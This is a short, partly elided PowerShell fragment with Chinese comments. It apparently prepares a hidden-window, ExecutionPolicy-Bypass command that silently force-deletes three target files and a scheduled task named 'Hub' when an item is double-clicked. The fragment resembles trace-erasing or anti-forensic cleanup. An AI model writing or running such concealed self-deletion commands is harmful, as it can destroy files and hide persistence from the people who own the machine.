...
$taskName = "Hub"  # 计划任务的名称

# 输出日志，确保删除操作已设置
Write-Host "Setting up DeleteOnOpen for: $TARGET1, $TARGET2, $TARGET3 and task $taskName"

# 构建删除文件和计划任务的命令
$cmd2 = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Start-Sleep -Milliseconds 150; 
Remove-Item -LiteralPath '$TARGET1' -Force -ErrorAction SilentlyContinue; 
Remove-Item -LiteralPath '$TARGET2' -Force -ErrorAction SilentlyContinue; 
Remove-Item -LiteralPath '$TARGET3' -Force -ErrorAction SilentlyContinue;
...
Write-Host "DeleteOnOpen setup complete. All three files and the scheduled task will be deleted when double-clicked."
